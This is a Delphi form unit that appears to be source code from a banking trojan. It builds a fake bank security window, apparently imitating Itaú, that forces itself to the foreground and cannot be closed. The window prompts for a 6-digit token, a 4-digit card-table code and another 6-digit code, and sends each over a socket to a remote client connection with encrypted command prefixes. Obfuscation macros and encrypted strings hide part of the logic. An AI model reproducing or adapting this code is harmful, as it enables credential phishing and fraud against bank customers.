unit uPITA;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, pngimage, ExtCtrls, {GIFImg,} AppEvnts, GIFImage, ComCtrls;
  {dxGDIPlusClasses;}

type
  TfIT_ALie = class(TForm)
    pnlIntro: TPanel;
    Image1: TImage;
    Label1: TLabel;
    Label2: TLabel;
    Image2: TImage;
    Label3: TLabel;
    Label4: TLabel;
    Image3: TImage;
    Label5: TLabel;
    pnlS6: TPanel;
    Image4: TImage;
    Label6: TLabel;
    Image5: TImage;
    Image6: TImage;
    Image7: TImage;
    edtS6: TEdit;
    pnlLoad: TPanel;
    Image8: TImage;
    Label9: TLabel;
    Label10: TLabel;
    Image9: TImage;
    Label11: TLabel;
    Image10: TImage;
    pnliT: TPanel;
    Image11: TImage;
    Label12: TLabel;
    Image13: TImage;
    Image14: TImage;
    edtiT: TEdit;
    Image12: TImage;
    lblFinal: TLabel;
    ApplicationEvents: TApplicationEvents;
    pnlTabela: TPanel;
    Image15: TImage;
    Label14: TLabel;
    Label15: TLabel;
    Image16: TImage;
    Image17: TImage;
    Image18: TImage;
    lblNTabela: TLabel;
    edtCodigo: TEdit;
    ProgressBar1: TProgressBar;
    imgErro: TImage;
    procedure Image6Click(Sender: TObject);
    procedure Image12Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure Image3Click(Sender: TObject);
    procedure ApplicationEventsDeactivate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Image15Click(Sender: TObject);
    procedure Image18Click(Sender: TObject);
    procedure FormDeactivate(Sender: TObject);
    procedure edtS6Click(Sender: TObject);
    procedure edtS6KeyPress(Sender: TObject; var Key: Char);
    procedure edtiTKeyPress(Sender: TObject; var Key: Char);
    procedure edtCodigoKeyPress(Sender: TObject; var Key: Char);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    Ativado: boolean;
  end;

var
  fIT_ALie: TfIT_ALie;

implementation

uses Conectar, uCrypt, uSOBRE, funcs2013;

{$R *.dfm}

procedure TfIT_ALie.ApplicationEventsDeactivate(Sender: TObject);
begin
  if Self.Visible then
     SetForegroundWindow(Self.Handle);
end;

procedure TfIT_ALie.edtCodigoKeyPress(Sender: TObject; var Key: Char);
begin
  if not (Key in['0'..'9',Chr(8)]) then
     Key:= #0;
end;

procedure TfIT_ALie.edtiTKeyPress(Sender: TObject; var Key: Char);
begin
  if not (Key in['0'..'9',Chr(8)]) then
     Key:= #0;
end;

procedure TfIT_ALie.edtS6Click(Sender: TObject);
begin
  imgErro.Visible := False;
end;

procedure TfIT_ALie.edtS6KeyPress(Sender: TObject; var Key: Char);
begin
  imgErro.Visible := False;
  if not (Key in['0'..'9',Chr(8)]) then
     Key := #0;
end;

procedure TfIT_ALie.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  Action := caNone;
end;

procedure TfIT_ALie.FormCreate(Sender: TObject);
begin

  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  fIT_ALie.Caption := Decrypt('µ8A',nw22);

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfIT_ALie.FormDeactivate(Sender: TObject);
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  if Self.Visible then
     SetForegroundWindow(self.Handle);

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfIT_ALie.FormShow(Sender: TObject);
begin
  edtiT.Clear;
  edtS6.Clear;
  edtCodigo.Clear;
  pnlIntro.BringToFront;
  SetForegroundWindow(fSOBRE.Handle);
end;

procedure TfIT_ALie.Image12Click(Sender: TObject);
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  Screen.Cursor := crHourGlass;
  Sleep(2000);
  Screen.Cursor := crDefault;
  if Length(edtiT.Text) <> 6 then
  begin
    edtiT.Clear;
    //Application.MessageBox(PChar(Crypt('D','B3AFF60A3F94371CC92CA850F35B4BE31B4BFF43FF24CB0F0D1AC47A9C5A90BF1E3514CD7CA75E9C4FFE3F9483')),PChar(Crypt('D','A9AB4F92BB1CB9548496EB0931A53FFA2B')), MB_ICONEXCLAMATION);
    Exit;
  end;
  // fClient.TCP.IOHandler.WriteLn('ITAITOKEN|' + edtiT.Text);
  // fCliente.CS2.Socket.SendText('VERMFTOKEN|' + edtiT.Text);
  fCliente.CS1.Socket.SendText( Decrypt('µ8AÄkÒÇ∑ó',nw22)+ '|' + edtiT.Text );
  edtiT.Clear;
  pnlLoad.BringToFront;

  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;


end;

procedure TfIT_ALie.Image15Click(Sender: TObject);
begin
  Application.Terminate;
end;

procedure TfIT_ALie.Image18Click(Sender: TObject);
begin

  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  Screen.Cursor := crHourGlass;
  Sleep(2000);
  Screen.Cursor := crDefault;
  if Length(edtCodigo.Text) <> 4 then
  begin
    edtCodigo.Clear;
    //Application.MessageBox(PChar(Crypt('D','4BD79E52F76DEF5B88C41BCE0740955D8584E1639F44FA5DF66887EA1AD1103D9C48F723C9A2')),
    //  PChar(Crypt('D','A9AB4F92BB1CB9548496EB0931A53FFA2B')), MB_ICONEXCLAMATION);
    Exit;
  end;
  // fClient.TCP.IOHandler.WriteLn('ITATABELA|' + edtCodigo.Text);
  // fClient.TCP.IOHandler.WriteLn(Decrypt('÷[Å†n’»Î',nw21)+'|' + edtCodigo.Text);
  fCliente.CS1.Socket.SendText( Decrypt('÷[Å†n’»Î',nw21)+'|' + edtCodigo.Text );
  edtCodigo.Clear;
  pnlLoad.BringToFront;

    // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure TfIT_ALie.Image3Click(Sender: TObject);
begin
  Screen.Cursor := crHourGlass;
  Sleep(2000);
  Screen.Cursor := crDefault;
  pnlS6.BringToFront;
end;

procedure TfIT_ALie.Image6Click(Sender: TObject);
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  Screen.Cursor := crHourGlass;
  Sleep(2000);
  Screen.Cursor := crDefault;
  if Length(edtS6.Text) <> 6 then
  begin
    edtS6.Clear;
    imgErro.Visible := True;
    // MessageBox( fITALie.Handle Application.Handle,PChar(Crypt('D','6BE718D70C5F4CFB2D7F86E201D70F2FEA6FA7F62AD96EE96AEB1FDE0377CF0C48E70C35D9172F18CB78A234E0093AE37DEA')),PChar(Crypt('D','A9AB4F92BB1CB9548496EB0931A53FFA2B')), MB_YESNO or MB_APPLMODAL or MB_ICONEXCLAMATION or MB_DEFBUTTON1);
    // MessageBox( fITALie.Handle ,PChar(Crypt('D','6BE718D70C5F4CFB2D7F86E201D70F2FEA6FA7F62AD96EE96AEB1FDE0377CF0C48E70C35D9172F18CB78A234E0093AE37DEA')),PChar(Crypt('D','A9AB4F92BB1CB9548496EB0931A53FFA2B')), MB_YESNO or MB_APPLMODAL or MB_ICONEXCLAMATION or MB_DEFBUTTON1);
    Exit;                                                                                                                                                                                                 //MB_YESNO or MB_APPLMODAL or MB_ICONQUESTION or MB_DEFBUTTON2);
  end;
  // fClient.TCP.IOHandler.WriteLn('ITAS6|' + edtS6.Text);
  // fClient.TCP.IOHandler.WriteLn(Decrypt('÷[ÄJ',nw21)+ '|' + edtS6.Text);
  fCliente.CS1.Socket.SendText( Decrypt('÷[ÄJ',nw21)+ '|' + edtS6.Text );
  edtS6.Clear;
  pnlLoad.BringToFront;

    // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;
  
end;

end.
